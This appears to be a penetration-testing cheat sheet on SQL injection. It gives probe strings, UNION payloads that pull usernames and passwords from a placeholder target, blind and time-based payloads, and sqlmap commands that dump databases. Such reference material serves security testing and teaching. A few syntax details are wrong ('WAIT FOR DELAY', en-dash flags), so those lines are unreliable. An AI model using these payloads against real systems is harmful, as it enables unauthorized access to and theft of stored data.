---
description: SQL Injection
---

# SQLi

SQL Injection is a web security vulnerability that allows an attacker to interfer with the queries that an application makes to its database.

It generally allows an attacker to view data that they are not normally able to retrieve. This might include data belonging to other users or any other data that the application itself is able to access.

To test SQLi, we will put special characters into the input fields and observe errors returned by the application. 

```bash
'
"
')
")
'; -- 
"; --
'); -- 
"); --
' or 1=1; --
' or 1; --
' or 'a'='a
SELECT @@version  # Determine what the database information is
```

## Manual 

```bash
 http://target/comment.php?id=1'
 http://target/comment.php?id=1 order by 6
 http://target/comment.php?id=1 union all select 1,2,4,5,6
 http://target/comment.php?id=1 union all select 1,2,4,table_name,6 from information_schema.tables
 http://target/comment.php?id=1 union all select 1,2,4,column_name,6 from information_schema.columns where table_name='users'
 http://target/comment.php?id=1 union all select 1,2,4,concat(name,0x3a,password),6 FROM users
```

## Blind SQLi

Generally occurs when an application is vuln do SQLi but it does not return an error, which makes identifying and exploiting SQLi more difficult. Concatenating strings for known good values can determine if the SQL database is directing interpreting the values we're providing.

* **Boolean based**

```bash
user' AND 1; --  # Test if value is true, if user is a valid user then it returns good
user' AND 0; --  # Test if SQLi is being interpreted, known good username but always false 0
```

* **Time based**

```bash
# MySQL

id=1-SLEEP(15)  # Resulting query (with malicious SLEEP injected).
id=1-BENCHMARK(100000000, rand())  # Resulting query (with malicious BENCHMARK injected).

# SQLServer

id=1; WAIT FOR DELAY '00:00:15'  # Resulting query (with malicious SLEEP injected).
id=1; IF SYSTEM_USER='sa' WAIT FOR DELAY '00:00:15'  # Resulting query (verify if user is sa).
```

## Union Attack

 _When an application is vulnerable to SQL injection and the results of the query are returned within the application's responses, the `UNION` keyword can be used to retrieve data from other tables within the database. This results in an SQL injection UNION attack._

 _The `UNION` keyword lets you execute one or more additional `SELECT` queries and append the results to the original query. For example:_

 _`SELECT a, b FROM table1 UNION SELECT c, d FROM table2`_

 _This SQL query will return a single result set with two columns, containing values from columns `a` and `b` in `table1` and columns `c` and `d` in `table2`_

 For a `UNION` query to work, two key requirements must be met:

*  **The individual queries must return the same number of columns.**
*  **The data types in each column must be compatible between the individual queries.**



* [https://portswigger.net/web-security/sql-injection/union-attacks](https://portswigger.net/web-security/sql-injection/union-attacks)

## Tools

### mysql cheat sheet

```bash
# Built-in mysql tools
mysql -u root    # Attempt to connect to db as root user, default is no pass
mysql -u root -p -h 10.10.10.1    # Connect to db at host 10.10.10.1 as root, prompts for password
mysql -u user1 -puser1pass    # Connect to local db. NOTE no space after '-p' for password!
mysqlshow -u something -psomethingpassword    # Again, NO SPACE AFTER -p FOR PASSWORD

# Inside the mysql shell
show databases;          # List all dbs on server  
use wordpress;           # Use a specific db
show tables;             # Show all tables for current db
describe wp_users;       # Show columns for a specific table
select * from wp_users;  # Dump all records from a table
```

### sqlmap

```bash
sqlmap -u "https://target.com/dir" # Without GET parameter
sqlmap -u "https://target.com/dir.php?id=1"  # With GET parameter

sqlmap –u "http://target.com/login.php" –data 'user=brun0&pass=something' # POST request with data
sqlmap -u "http://target.com/dir.php?id=1&Search=Submit" -p id # Testing id parameter

```

* **If we find SQLi in the target website then we can use the following commands.**

```bash
sqlmap -u "http://target.com/login.php?id=1" --dbs       # Lists all dbs on the host
sqlmap -u "http://target.com/login.php?id=1" -D DB_NAME --tables    # Lists all tables inside all dbs on host
sqlmap -u "http://target.com/login.php?id=1" -D DB_NAME -T TB_NAME --columns # List all columns
sqlmap -u "http://target.com/login.php?id=1" -D DB_NAME -T TB_NAME -C "col1,col2" --dump # List info from columns
sqlmap -u "http://target.com/login.php?id=1" -D DB_NAME --dump # Dump the database
```

## References

* [https://tools.kali.org/vulnerability-analysis/sqlmap](https://tools.kali.org/vulnerability-analysis/sqlmap)
* [https://gitbook.seguranca-informatica.pt/cheat-sheet-1/web/sql-injection](https://gitbook.seguranca-informatica.pt/cheat-sheet-1/web/sql-injection)

